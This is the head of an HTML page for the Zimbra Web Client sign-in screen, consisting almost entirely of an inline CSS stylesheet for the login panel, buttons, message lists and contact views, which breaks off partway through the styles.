<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <title>Zimbra Web Client Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <style>
      .ScreenReaderOnly {
        position: absolute !important;
        height: 1px;
        width: 1px;
        overflow: hidden;
        clip: rect(1px, 1px, 1px, 1px);
      }
      .user_font_modern,
      .user_font_modern TEXTAREA,
      .user_font_modern INPUT {
        font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans",
          sans-serif;
      }
      .user_font_classic,
      .user_font_classic TEXTAREA,
      .user_font_classic INPUT {
        font-family: Tahoma, Arial, sans-serif;
      }
      .user_font_wide,
      .user_font_wide TEXTAREA,
      .user_font_wide INPUT {
        font-family: Verdana, sans-serif;
      }
      .user_font_system,
      .user_font_system TEXTAREA,
      .user_font_system INPUT {
        font-family: "Segoe UI", "Lucida Sans", sans-serif;
      }
      .user_font_size_small {
        font-size: 11px;
      }
      .user_font_size_normal {
        font-size: 12px;
      }
      .user_font_size_large {
        font-size: 14px;
      }
      .user_font_size_larger {
        font-size: 16px;
      }
      P,
      TH,
      TD,
      DIV,
      SELECT,
      INPUT[type="text"],
      INPUT[type="password"],
      INPUT[type="file"],
      TEXTAREA,
      BUTTON {
        font-size: 1rem;
      }
      HTML {
        width: 100%;
        height: 100%;
      }
      BODY {
        width: 100%;
        height: 100%;
        margin: 0;
      }
      FORM {
        margin: 0;
        padding: 0;
      }
      TABLE {
        border-collapse: collapse;
        border-spacing: 0;
        border-width: 0;
      }
      TD {
        border-width: 0;
        padding: 0;
      }
      FIELDSET {
        border: 1px solid #f2f2f2;
        padding: 5px;
        margin: 5px;
      }
      LEGEND {
        font-weight: bold;
        white-space: nowrap;
        overflow: hidden;
        color: #333;
      }
      INPUT[readonly] {
        color: #999;
        background-color: transparent;
        border: 1px solid #e5e5e5;
      }
      TEXTAREA {
        padding: 0.2em 0.3em;
        cursor: text;
        color: black;
        border: 1px solid #bfbfbf;
        resize: none;
      }
      TEXTAREA[readonly] {
        color: #999;
        background-color: transparent;
        border: 1px solid #e5e5e5;
      }
      INPUT[type="checkbox"] {
        cursor: pointer;
      }
      INPUT[type="checkbox"]:focus {
        outline-style: solid;
        outline-width: 1px;
        outline-color: #5b798a;
      }
      INPUT[type="text"],
      INPUT[type="password"] {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: black;
        border: 1px solid #bfbfbf;
      }
      INPUT[disabled] {
        color: #999;
        background-color: transparent;
        border: 1px solid #e5e5e5;
      }
      textarea {
        padding: 0.2em 0.3em;
        cursor: text;
        color: black;
        border: 1px solid #bfbfbf;
      }
      .CompactTable {
        border-collapse: collapse;
        border-spacing: 0;
        padding: 0;
      }
      .fullSize {
        width: 100%;
        height: 100%;
      }
      .fullWidth {
        width: 100%;
      }
      .fullHeight {
        height: 100%;
      }
      .minSize {
        width: 1px;
        height: 1px;
      }
      .leftAlign {
        text-align: left;
      }
      .rightAlign {
        text-align: right;
      }
      .checkboxLabel {
        font-weight: bold;
      }
      .ToolbarBg {
        background-color: transparent;
      }
      .ZmHead {
        font-size: 1.36rem;
        font-weight: bold;
      }
      .ZmSubHead {
        font-size: 1.18rem;
      }
      .ZmBigger {
        font-size: 1.36rem;
        font-weight: bold;
      }
      .ZmFinePrint {
        font-size: 0.82rem;
      }
      .ZmImportant {
        color: darkred;
      }
      .ZmFieldLabel {
        white-space: nowrap;
        overflow: hidden;
        color: #333;
      }
      .ZmFieldLabelLeft {
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: left;
      }
      .ZmFieldLabelRight {
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: right;
      }
      .ZmFieldLabelCenter {
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: center;
      }
      ZmSectionLabel {
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        border-bottom: 1px solid #f2f2f2;
        font-size: 1.36rem;
        font-weight: bold;
      }
      .TextPadding {
        padding-left: 3px;
        padding-right: 3px;
      }
      .BigHeaderBg {
        padding-top: 1px;
        border-bottom: 1px solid #f2f2f2;
        background-color: #e5e5e5;
        height: 36px;
        height: 2.8rem;
      }
      .ZmOverride {
        background-color: #fff6bf;
        padding: 2px;
      }
      .ZmGraphKey {
        background-color: #fff;
        border-color: #7f7f7f #cccccc #ccc #7f7f7f;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .ZmGraphKeyHeader {
        background-color: #e5e5e5;
        font-size: 1.18rem;
        color: #333;
        padding-left: 3px;
        padding-right: 3px;
        text-align: left;
        font-weight: bold;
        vertical-align: middle;
      }
      .ZmGraphKeyBody {
        padding: 5px;
        margin: 5px;
      }
      .ZmGraphKeyColorBox {
        border-color: #7f7f7f #cccccc #ccc #7f7f7f;
        margin: 0;
        border-width: 1px;
        border-style: solid;
        width: 10px;
        height: 10px;
      }
      .ZmGraphKeyColorText {
        color: #333;
        white-space: nowrap;
        overflow: hidden;
      }
      .horizSep {
        height: 1px !important;
        border-bottom: 1px solid #f2f2f2;
        font-size: 1px;
        line-height: 1px;
        margin: 5px 0;
        width: 100%;
      }
      .vertSep {
        border-left: 1px solid #f2f2f2;
        margin-left: 3px;
        padding-right: 3px;
        height: 20px;
      }
      DIV.vSpace {
        margin: 5px 0;
      }
      TD.vSpace {
        width: 2px;
      }
      .AttLink:link,
      .AttLink:visited {
        color: #005a95;
        text-decoration: none;
        cursor: pointer;
      }
      .AttLink:hover {
        color: #005a95;
        text-decoration: underline;
      }
      .AttLink:active {
        color: darkgreen;
        text-decoration: underline;
      }
      .Row-selected .AttLink:link,
      .Row-selected .AttLink:active,
      .Row-selected .AttLink:visited {
        color: #005a95;
        text-decoration: none;
        cursor: pointer;
      }
      .AttLink:hover,
      .Row-selected .AttLink:hover {
        color: #005a95;
        text-decoration: underline;
      }
      .DragProxy {
        opacity: 0.7;
      }
      .notDroppable {
        border: 2px solid red !important;
        background-color: #99cae7;
        box-shadow: 5px 5px 15px #999;
        opacity: 0.7;
      }
      .notDroppable-linux {
        border: 2px solid red !important;
        background-color: #99cae7;
        box-shadow: 5px 5px 15px #999;
      }
      .droppable {
        border: 2px solid green !important;
        background-color: #99cae7;
        box-shadow: 5px 5px 15px #999;
        opacity: 0.7;
      }
      .droppable-linux {
        border: 2px solid green !important;
        background-color: #99cae7;
        box-shadow: 5px 5px 15px #999;
      }
      .DropTarget {
        border: 1px solid green !important;
      }
      .DragProxyTextLabel {
        font-weight: bold;
        color: white;
      }
      .BusyOverlay TABLE,
      .VeilOverlay TABLE {
        opacity: 0.5;
        cursor: wait;
        background-color: transparent;
      }
      .BusyOverlay-linux TABLE,
      .VeilOverlay-linux TABLE {
        cursor: wait;
        background-color: transparent;
      }
      .VeilOverlay TABLE {
        cursor: default !important;
        cursor: not-allowed !important;
        background-color: black;
      }
      .VeilOverlay-linux TABLE {
        cursor: default !important;
        cursor: not-allowed !important;
      }
      .CurtainOverlay TABLE {
        background-color: black;
      }
      html[data-istwofactorsetuppage] .VeilOverlay TABLE {
        background-image: -webkit-gradient(
          linear,
          left top,
          bottom bottom,
          to(#007cc3),
          from(#00639c)
        );
        background-image: -webkit-linear-gradient(top, #007cc3, #00639c);
        opacity: 1;
      }
      .Row {
        height: 20px;
        height: 1.8rem;
        cursor: pointer;
        margin: 1px;
        padding-right: 3px;
        -khtml-user-select: none;
      }
      .RowDouble {
        height: 20px;
        height: 1.8rem;
        cursor: pointer;
        margin: 1px;
        padding-right: 3px;
        -khtml-user-select: none;
        height: 36px;
        height: 2.6rem;
        border-bottom-color: #ccc;
        padding-top: 3px;
      }
      .Row TABLE,
      .RowDouble TABLE {
        table-layout: fixed;
      }
      .Row TD,
      .RowDouble TD,
      .Row DIV,
      .RowDouble DIV {
        vertical-align: middle;
        white-space: nowrap;
        overflow: hidden;
      }
      .RowDouble TD {
        vertical-align: top;
      }
      .RowDouble TD.SubjectDoubleRow {
        vertical-align: text-bottom;
      }
      .ZmMsgListBottomRowIcon {
        margin-left: 23px;
        margin-right: 5px;
      }
      .ZmConvExpanded .ZmMsgListBottomRowIcon {
        margin-left: 39px;
      }
      .ZmMsgListSelection .ZmMsgListBottomRowIcon {
        margin-left: 37px;
      }
      .ZmConvExpanded .ZmMsgListSelection .ZmMsgListBottomRowIcon {
        margin-left: 54px;
      }
      .Row {
        background-color: #fff;
      }
      .RowOdd {
        background-color: #fff;
      }
      .selected,
      .Row-selected,
      .Row-selected-dragProxy,
      .Row-selected-disabled {
        background-color: #99cae7 !important;
        background-image: none !important;
      }
      .Row-selected .ZmListFlagsWrapper,
      .Row-selected-disabled .ZmListFlagsWrapper,
      .Row-selected .ZmMsgListDate,
      .Row-selected-disabled .ZmMsgListDate {
        background: #99cae7 !important;
      }
      .Row-selected-actioned .ZmListFlagsWrapper,
      .Row-selected-actioned .ZmMsgListDate {
        background: #99cae7 !important;
      }
      .Row-altSelected {
        background-color: #e5f1f9 !important;
        background-image: none !important;
      }
      .Row-altSelected .ZmListFlagsWrapper,
      .Row-altSelected .ZmMsgListDate {
        background: #e5f1f9 !important;
      }
      .Row-matched-dragProxy {
        background-color: yellow;
      }
      .Row-matched TABLE,
      .Row-matched-drag TABLE {
        table-layout: fixed;
      }
      .Row-focused {
        outline-style: solid;
        outline-width: 1px;
        outline-color: #5b798a;
      }
      .Row-selected-actioned {
        background-color: #99cae7 !important;
      }
      .Row-dragProxy,
      .Row-matched-dragProxy {
        background-color: #99cae7 !important;
      }
      .RowDouble-dragProxy .ZmListFlagsWrapper,
      .RowDouble-dragProxy .ZmMsgListDate,
      .Row-dragProxy .ZmListFlagsWrapper,
      .Row-dragProxy .ZmMsgListDate {
        background-color: #99cae7 !important;
      }
      .Row TD,
      .RowDouble TD,
      .Row DIV,
      .RowDouble DIV {
        color: #333;
      }
      .RowOdd TD,
      .RowOdd DIV {
        color: #333;
      }
      .RowOdd .ZmMsgListDate,
      .RowOdd .ZmListFlagsWrapper {
        background-color: #fff;
      }
      .RowEven .ZmMsgListDate {
        background-color: #fff;
      }
      LI.RowDouble,
      LI.Row {
        list-style: none;
      }
      .selected TD,
      .Row-selected TD,
      .Row-selected-dragProxy TD,
      .Row-selected-disabled TD {
        color: black;
      }
      .Row-focused TD {
        color: #333;
      }
      .Row-selected-right TD {
        color: #333;
      }
      .Row-dragProxy TD,
      .Row-matched-dragProxy TD {
        color: #333;
      }
      .Row TD.Flag,
      .Row TD.Attach,
      .Row TD.Tag,
      .Row TD.Icon,
      .Row TD.Count,
      .Row-selected TD.Flag,
      .Row-selected TD.Attach,
      .Row-selected TD.Tag,
      .Row-selected TD.Icon,
      .Row-selected TD.Count,
      .Row-dragProxy TD.Flag,
      .Row-dragProxy TD.Attach,
      .Row-dragProxy TD.Tag,
      .Row-dragProxy TD.Icon,
      .Row-dragProxy TD.Count,
      .Row-selected-dragProxy TD.Flag,
      .Row-selected-dragProxy TD.Attach,
      .Row-selected-dragProxy TD.Tag,
      .Row-selected-dragProxy TD.Icon,
      .Row-selected-dragProxy TD.Count,
      .Row-matched-dragProxy TD.Flag,
      .Row-matched-dragProxy TD.Attach,
      .Row-matched-dragProxy TD.Tag,
      .Row-matched-dragProxy TD.Icon,
      .Row-matched-dragProxy TD.Count,
      .Row-dragProxy TD.Flag,
      .Row-dragProxy TD.Attach,
      .Row-dragProxy TD.Tag,
      .Row-dragProxy TD.Icon,
      .Row-dragProxy TD.Count {
        text-align: center;
      }
      .RowDouble TD.Count,
      .RowDouble-selected TD.Count {
        text-align: right;
      }
      .Unread {
        color: #333;
        font-weight: bold;
      }
      .Trash {
        color: #999;
        text-decoration: line-through;
      }
      .Unread .SubjectDoubleRow {
        color: #333;
        font-weight: bold;
      }
      .ZmOverview {
        width: 100%;
        height: 100%;
      }
      .ZmOverviewContainer {
        background-color: #fff;
        border: none;
        border-radius: 3px;
      }
      .ZmVoiceOverviewContainer .ZmOverview,
      .ZmOverviewContainer .ZmOverview,
      .dialogOverviewContainer .OverviewTree {
        height: auto;
      }
      .OverviewTree {
        width: 100%;
      }
      .dialogOverview {
        background-color: #fff;
        border: none;
        border-radius: 3px;
        border-color: #7f7f7f #cccccc #ccc #7f7f7f;
        margin: 0;
        border-width: 1px;
        border-style: solid;
        padding: 5px;
        height: 200px;
      }
      .dialogOverviewContainer {
        background-color: #fff;
      }
      .dialogOverview TD {
        color: #333;
      }
      .pickerOverview {
        background-color: #fff;
        border: none;
        border-radius: 3px;
        height: 100%;
      }
      .overviewHeader {
        cursor: default;
        background-color: transparent;
        color: #333;
        font-weight: bold;
        padding-top: 1px;
        padding-bottom: 1px;
      }
      .overviewHeader-Text,
      .overviewHeader-dragOver {
        color: #333;
        font-weight: bold;
      }
      .overviewHeader .imageCell {
        padding-right: 5px;
        padding-top: 0.2rem;
        white-space: nowrap;
      }
      .overviewHeader TD {
        background-color: #fff;
      }
      .overviewHeader.overviewHeader-selected TD {
        background-color: #99cae7;
      }
      .overviewHeader.overviewHeader-selected.overviewHeader-selected-focused
        TD {
        border-color: #4c6573 #1e282e #1e282e #5b798a;
        outline: none;
      }
      .inlineIcon {
        font-family: Verdana;
        font-size: 13px;
      }
      .inlineContactTagIcon {
        font-size: 11px;
        vertical-align: middle;
      }
      .TooltipHint {
        font-style: italic;
        text-align: center;
        white-space: nowrap;
      }
      .TooltipNotInAddrBook {
        white-space: nowrap;
        text-align: center;
        padding: 8px 0 5px 0;
      }
      .ImgTagShared {
        display: inline-block;
      }
      .FakeAnchor,
      A:link,
      A:visited {
        color: #005a95;
        text-decoration: none;
        cursor: pointer;
      }
      .FakeAnchor:hover,
      A:hover {
        color: #005a95;
        text-decoration: underline;
      }
      .FakeAnchor:active,
      A:active {
        color: darkgreen;
        text-decoration: underline;
      }
      .FakeAnchor:focus,
      A:focus {
        outline-style: solid;
        outline-width: 1px;
        outline-color: #5b798a;
      }
      .FakeAnchor.ZDisabled,
      .FakeAnchor.ZDisabled:hover,
      .FakeAnchor.ZDisabled:active {
        color: #999;
        text-decoration: none;
      }
      .AutoAnchor,
      .AutoAnchor:link,
      .AutoAnchor:visited {
        color: #005a95;
        text-decoration: none;
        cursor: pointer;
        border-bottom: 1px dotted;
        color: #005a95;
      }
      .AutoAnchor:hover {
        color: #005a95;
        text-decoration: underline;
      }
      .AutoAnchor:active {
        color: darkgreen;
        text-decoration: underline;
      }
      .LoginScreen P,
      .LoginScreen TH,
      .LoginScreen TD,
      .LoginScreen DIV,
      .LoginScreen SPAN,
      .LoginScreen SELECT,
      .LoginScreen INPUT,
      .LoginScreen TEXTAREA,
      .LoginScreen BUTTON,
      .LoginScreen A {
        font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans",
          sans-serif;
      }
      HTML {
        width: 100%;
        height: 100%;
      }
      BODY {
        background-color: #fff;
        width: 100%;
        height: 100%;
        margin: 0;
      }
      FORM {
        margin: 0;
        padding: 0;
      }
      .ZSplashScreen {
        background-color: #fff;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        position: absolute;
      }
      #ZLoginPanel {
        position: relative;
        width: 500px;
        overflow: visible;
        background-color: #f2f2f2;
        box-shadow: 5px 5px 15px #999;
        border-radius: 4px;
        border-color: #999 #7f7f7f #7f7f7f #999999;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .LoginScreen FORM {
        text-align: center;
      }
      .form {
        border-collapse: collapse;
        color: white;
        margin: 0 auto;
        text-align: left;
      }
      .form TD:first-child LABEL {
        margin-right: 20px;
      }
      .form TD {
        padding-bottom: 10px;
      }
      .form INPUT[type="text"],
      .form INPUT[type="password"] {
        border: 1px solid #fff;
        padding: 0;
        width: 235px;
        height: 20px;
      }
      .form INPUT[type="text"]:focus,
      .form INPUT[type="password"]:focus {
        border: 1px solid #99cae7;
      }
      .form SELECT {
        height: 20px;
        width: 165px;
      }
      .form .submitTD {
        text-align: left;
      }
      .form .ZLoginButton {
        border-radius: 3px;
        border: 1px solid #999;
        float: right;
        font-size: 1em;
      }
      .form HR {
        border-color: transparent transparent white;
        height: 0;
      }
      .LoginScreen .positioning {
        position: relative;
        z-index: 20;
      }
      .LoginScreen #ZLoginWhatsThisAnchor {
        color: white;
        font-size: 0.9em;
        margin-left: 5px;
      }
      .LoginScreen #ZLoginForgotPassword {
        color: white;
        font-size: 0.9em;
        float: right;
      }
      .LoginScreen #ZLoginWhatsThis {
        left: 0;
        margin-left: -10em;
        position: absolute;
        top: 25px;
        width: 40em;
        z-index: 30;
      }
      .LoginScreen .ZLoginInfoMessage {
        background-color: #fff;
        border: 1px solid #005d92;
        color: #333;
        padding: 3px 7px;
        text-align: left;
        box-shadow: 0 0 2px black;
      }
      .DwtButton {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        background: #fff;
      }
      .DwtButton-hover {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        background: #cce4f3;
      }
      .DwtButton-active {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        background: #99cae7;
      }
      .DwtButton-selected {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        background: #99cae7;
      }
      .DwtButton-disabled {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        background: #fff;
      }
      .DwtButton-active {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        border-color: #7f7f7f #3f3f3f #3f3f3f #7f7f7f;
        margin: 0;
        border-width: 1px;
        border-style: solid;
        background-color: #a3cfe9;
      }
      .DwtButton-focused {
        height: 22px;
        height: 2rem;
        cursor: pointer;
        background: #fff;
        border-color: #4c6573 #1e282e #1e282e #5b798a;
        outline: none;
      }
      .DwtButton .Text {
        text-align: center;
        color: #333;
      }
      .DwtButton-hover .Text {
        text-align: center;
        color: #333;
      }
      .DwtButton-active .Text {
        text-align: center;
        color: #333;
      }
      .DwtButton-selected .Text {
        text-align: center;
        color: #333;
      }
      .DwtButton-disabled .Text {
        text-align: center;
        color: #999;
      }
      .DwtButton-active .Text {
        text-align: center;
        color: #333;
      }
      .DwtButton-focused .Text {
        text-align: center;
        color: #333;
      }
      .LaunchButton {
        padding: 10px;
        text-align: center;
      }
      .LaunchButton INPUT {
        font-size: 1.36rem;
        font-weight: bold;
        background-color: #dcf9fe;
        border: 1px solid #6cf;
        color: black;
        cursor: pointer;
        display: inline-block;
        height: 35px;
        text-align: center;
        width: 250px;
        box-shadow: 0 0 3px black;
        background-image: -webkit-gradient(
          linear,
          left top,
          bottom bottom,
          to(#dcf9fe),
          from(#9ff0ff)
        );
        background-image: -webkit-linear-gradient(top, #dcf9fe, #9ff0ff);
        border-radius: 26px;
      }
      .LaunchButton INPUT:hover {
        box-shadow: 0 0 1px black;
        background-image: -webkit-gradient(
          linear,
          left top,
          bottom bottom,
          to(#9ff0ff),
          from(#dcf9fe)
        );
        background-image: -webkit-linear-gradient(top, #9ff0ff, #dcf9fe);
      }
      .spacer {
        font-size: 1.2em;
        line-height: 1.3em;
        padding: 5px;
      }
      .LoginScreen .center-small {
        background-color: #006faf;
        margin: 10px auto;
        overflow: visible;
        padding-top: 5px;
        width: 250px;
      }
      .LoginScreen .center-small #ZLoginErrorPanel {
        max-height: 40px;
        overflow: auto;
      }
      .center-small H1 {
        margin: 10px 20px 20px;
      }
      .center-small .decor1 {
        display: none;
      }
      .center-small .form {
        border-collapse: collapse;
        color: white;
        margin: 0 10px;
        text-align: left;
      }
      .center-small .form td:first-child LABEL {
        margin-right: 5px;
      }
      .center-small .form INPUT[type="text"],
      .center-small .form INPUT[type="password"] {
        border: 1px solid #007cc3;
        width: 155px;
      }
      .center-small .form SELECT {
        width: 140px;
      }
      .center-small #ZloginWhatsThisAnchor,
      .center-small .offline {
        display: none;
      }
      .Footer-small {
        position: relative;
        text-align: center;
        width: 100%;
      }
      .Footer-small .copyright {
        font-size: 9px !important;
      }
      .Footer-small #ZLoginNotice {
        display: none;
      }
      HTML {
        font-size: 12px;
      }
      IMG {
        border: none;
        vertical-align: middle;
      }
      LEGEND {
        color: #999;
      }
      SUBMIT,
      .tbButton,
      .searchButton {
        border-radius: 3px;
        border: 1px solid #999;
        height: 100%;
        background: #fff;
        text-align: center;
        color: #333;
        font-size: 1rem;
      }
      .tbButton {
        height: auto;
      }
      .ZhAppLinks {
        vertical-align: middle;
        white-space: nowrap;
      }
      .ZhAppLinks a:link,
      .ZhAppLinks a:visited {
        text-decoration: none;
        font-weight: bold;
        color: darkblue;
      }
      .ZhAppSwitchLink {
        white-space: nowrap;
      }
      .ZhAppSwitchLink a,
      .ZhAppSwitchLink a:link,
      .ZhAppSwitchLink a:visited {
        font-size: 10px;
        font-weight: normal;
      }
      .Tabs {
        margin-right: 10px;
      }
      .Tab {
        padding: 2px;
      }
      .Tab SPAN {
        vertical-align: middle;
        padding-left: 5px;
        padding-right: 5px;
      }
      .Tab .icon {
        padding-right: 0;
      }
      .Tab IMG {
        position: relative;
        top: -1px;
        left: 4px;
      }
      .TabFiller {
        background-color: #fff;
        border-left-width: 0;
        text-align: center;
        white-space: nowrap;
        overflow: hidden;
      }
      .TabSpacer {
        padding: 2px;
        width: 2px;
        border: none;
      }
      .TabNormal {
        text-align: center;
        white-space: nowrap;
        overflow: hidden;
        color: white;
      }
      .TabSelected {
        text-align: center;
        white-space: nowrap;
        overflow: hidden;
        background-color: #fff;
        border-bottom-width: 0;
        color: #333;
      }
      .Tabs A:link,
      .Tabs A:visited {
        color: #333;
        text-decoration: none;
      }
      .Overview {
        width: 170px;
        padding: 0 6px 0 6px;
      }
      .Tree {
        background-color: #fff;
        border: none;
        border-radius: 3px;
        height: 100%;
        height: auto;
      }
      .Tree TD {
        color: #333;
        background-color: transparent;
        height: 18px;
        height: 1.6rem;
        margin: 3px 0;
        margin: 0.25rem 0;
        border: 1px solid transparent;
        padding: 1px 0;
        padding: 0.1rem 0;
        cursor: pointer;
        padding: 2px 0 2px 10px;
      }
      .Tree TH {
        background-color: transparent;
      }
      .Tree .Header {
        text-align: left;
        font-weight: bold;
        height: 18px;
        padding: 1px 5px 0 0;
      }
      .Tree a:link,
      .Tree a:visited {
        color: #333;
        text-decoration: none;
      }
      .ZhTISelected {
        background-color: #b2d7ed !important;
      }
      .List,
      TD.List {
        border: 1px solid #b2b2b2;
        border-width: 1px;
      }
      .ZhRow TD {
        height: 20px;
        height: 1.8rem;
        cursor: pointer;
        margin: 1px;
        padding-right: 3px;
        background-color: #fff;
        padding-right: 6px;
      }
      .ZhRowOdd TD {
        height: 20px;
        height: 1.8rem;
        cursor: pointer;
        margin: 1px;
        padding-right: 3px;
        background-color: #fff;
        padding-right: 6px;
      }
      .List TH {
        text-align: left;
        padding-left: 3px;
        white-space: nowrap;
        overflow: hidden;
        cursor: pointer;
        padding-top: 1px;
        border-bottom: 1px solid #f2f2f2;
        background-color: #e5e5e5;
      }
      .List A:link,
      .List A:visited {
        color: #333;
        text-decoration: none;
      }
      .List TH A:link,
      .List TH A:visited {
        text-decoration: underline;
      }
      .List .Img {
        width: 20px;
        padding-right: 0;
      }
      .List .ImgNarrow {
        width: 12px;
        padding-right: 0;
      }
      .List .CB {
        width: 20px;
        padding-right: 0;
      }
      .List .Radio {
        width: 20px;
        padding-right: 0;
        text-align: center;
      }
      .RuleList TD {
        padding: 8px;
      }
      .ZhDisplayRuleContent {
        background-color: #fff;
        border-color: #ccc #999999 #999 #cccccc;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .ZhEditRuleContent {
        border: 1px solid #b2b2b2;
      }
      .RuleList {
        background-color: #fff;
      }
      .RuleHint {
        color: #999;
        font-size: 0.82rem;
      }
      .RuleList A:link,
      .RuleList A:visited {
        color: #333;
        text-decoration: underline;
      }
      .MsgStatusImg {
        width: 20px;
        padding-right: 6px;
      }
      A:visited {
        color: #005a95;
      }
      .ConvSummary A {
        color: #333;
        text-decoration: none;
      }
      .TopContent {
        padding: 0 15px 0 0;
      }
      .Tree .ZhTreeEdit a:link,
      .Tree .ZhTreeEdit a:visited {
        color: #333;
        text-decoration: underline;
      }
      .ZhTreeEdit {
        color: #ccc;
        font-size: 1rem;
        padding-right: 4px;
        font-weight: normal;
        text-decoration: underline;
      }
      .ZhAppContent2 {
        background-color: #fff;
      }
      .Conv2Tb {
        background-color: transparent;
      }
      .ZhAppContent {
        border: 1px solid #b2b2b2;
        border-width: 1px;
      }
      .ZhAppColContent {
        border: 1px solid #b2b2b2;
        border-width: 1px;
      }
      .ZhAppViewContent {
        background-color: #fff;
        border-color: #ccc #999999 #999 #cccccc;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .ZhDocPreviewContent {
        border-width: 1px;
        vertical-align: baseline;
        padding-left: 5px;
      }
      .SearchBar {
        padding: 5px;
      }
      .TbTop INPUT,
      .TbBottom INPUT {
        padding: 0;
        margin: 0;
        border: none;
        cursor: pointer;
        text-align: left;
        font-size: 1rem;
        color: #333;
        background-color: transparent;
      }
      .TbTop {
        height: 26px;
        height: 2.4rem;
        padding-top: 2px;
        padding-top: 0.2rem;
        background-color: transparent;
      }
      .TbBottom {
        height: 26px;
        height: 2.4rem;
        padding-top: 2px;
        padding-top: 0.2rem;
        background-color: transparent;
        margin-bottom: 5px;
      }
      .Tb a:link,
      .Tb a:visited {
        text-decoration: none;
        font-weight: normal;
        color: #333;
      }
      .Tb2 {
        background-color: transparent;
      }
      .TbBt {
        padding: 2px;
      }
      .TbBt A {
        padding: 0 5px 0 5px;
      }
      .TbBt#caltb a:link,
      .TbBt#caltb a:visited {
        color: #333;
        text-decoration: none;
      }
      .Tb SPAN {
        vertical-align: middle;
      }
      .Tags SPAN {
        vertical-align: middle;
        padding-right: 5px;
      }
      .Unread {
        font-weight: bold;
      }
      .RowSelected TD {
        background-color: #99cae7 !important;
      }
      .RowMatched TD {
        background-color: yellow;
      }
      .ZhConvExpanded TD {
        background-color: #eef;
      }
      .Folder {
        padding-bottom: 2px;
      }
      .Folder SPAN {
        vertical-align: middle;
        padding-left: 3px;
      }
      .Paging {
        padding: 0 5px 0 5px;
      }
      .Compose {
        border: 1px solid #b2b2b2;
      }
      .Compose .tobutton {
        width: 50px;
      }
      .ConvSummary {
        background-color: #e5e5e5;
        border-bottom: 1px solid #f2f2f2;
        padding: 5px 0 5px 0;
      }
      .ConvSummary2 {
        border-bottom: 1px solid #f2f2f2;
        background-color: transparent;
        padding: 5px 0 5px 5px;
      }
      .ConvSummary SPAN,
      .CompOrigAtt SPAN {
        vertical-align: middle;
      }
      .MsgHdr {
        background-color: #e5e5e5;
        border-bottom: 1px solid #f2f2f2;
        padding: 3px;
        border-color: #ccc #999999 #999 #cccccc;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .MsgHdr TABLE {
        background-color: #e5e5e5;
        padding: 5px 0 5px 0;
      }
      .MsgOps {
        background-color: transparent;
      }
      .MsgHdrName {
        width: 10%;
        padding: 3px 0 3px 0;
        vertical-align: top;
        text-align: right;
        font-weight: bold;
        white-space: nowrap;
      }
      .MsgHdrValue {
        padding: 3px 3px 3px 3px;
        vertical-align: top;
        overflow: hidden;
      }
      .MsgHdrValue IMG {
        vertical-align: top;
      }
      .MsgHdrSub {
        font-size: 1.36rem;
        font-weight: bold;
      }
      .MsgHdrSender {
        font-size: 1.18rem;
        font-weight: bold;
        padding: 3px 3px 3px 3px;
        vertical-align: top;
        overflow: hidden;
      }
      .MsgHdrSent {
        padding: 3px 3px 3px 3px;
        vertical-align: top;
        overflow: hidden;
        white-space: nowrap;
      }
      .MsgHdrAttAnchor {
        padding: 3px 3px 3px 3px;
        vertical-align: top;
        overflow: hidden;
        white-space: nowrap;
      }
      .MsgHdrAttAnchor A,
      .CompOrigAtt A {
        color: #333;
        text-decoration: none;
      }
      .MsgBody {
        border-color: #7f7f7f #cccccc #ccc #7f7f7f;
        margin: 0;
        border-width: 1px;
        border-style: solid;
        background-color: #fff;
        font-family: monospace;
        font-size: 13px;
        padding: 10px;
        overflow: auto;
      }
      .MsgBody .zUrl {
        font-family: monospace;
        font-size: 1.18rem;
      }
      .MsgBody-html {
        padding: 10px;
      }
      .zPrintMsgs .MsgBody-html,
      .zPrintMsgs {
        word-wrap: break-word;
        word-break: break-word;
        white-space: normal;
      }
      .zPrintMsgs table.Msg {
        table-layout: fixed;
      }
      .MsgBody-html pre,
      .MsgBody-html pre *,
      .MsgBody-html body,
      .MsgBody-html Section1 {
        white-space: pre-wrap;
        word-wrap: break-word !important;
        text-wrap: suppress !important;
      }
      .MsgBody-plain-tab {
        display: inline;
        word-wrap: break-word !important;
      }
      .MsgCompose {
        font-family: monospace;
        font-size: 1.18rem;
        width: 99%;
      }
      .Fragment {
        color: gray;
        font-weight: normal;
      }
      .contactLabel {
        color: #333;
        white-space: nowrap;
        overflow: hidden;
        width: 1%;
        text-align: right;
      }
      .contactImage {
        max-width: 48px;
        max-height: 48px;
      }
      .IEcontactImage {
        height: 48px;
      }
      .editContactLabel {
        color: #333;
        white-space: nowrap;
        overflow: hidden;
        width: 18em;
        text-align: right;
      }
      .editContactGroupLabel {
        width: 18em;
        color: #333;
        white-space: nowrap;
        overflow: hidden;
        text-align: left;
      }
      .editContactGroupHintLabel {
        color: gray;
        white-space: nowrap;
        overflow: hidden;
        text-align: right;
      }
      .optionSectionLabel {
        color: #333;
        white-space: nowrap;
        overflow: hidden;
        font-size: 15px;
        font-weight: bold;
      }
      .sectionLabel {
        color: #333;
        white-space: nowrap;
        overflow: hidden;
        border-bottom: 1px solid #8597a7;
        font-size: 15px;
        font-weight: bold;
      }
      .companyName,
      .companyName DIV {
        font-size: 15px;
        font-weight: bold;
      }
      .companyFolder {
        font-size: 13px;
        overflow: hidden;
        white-space: nowrap;
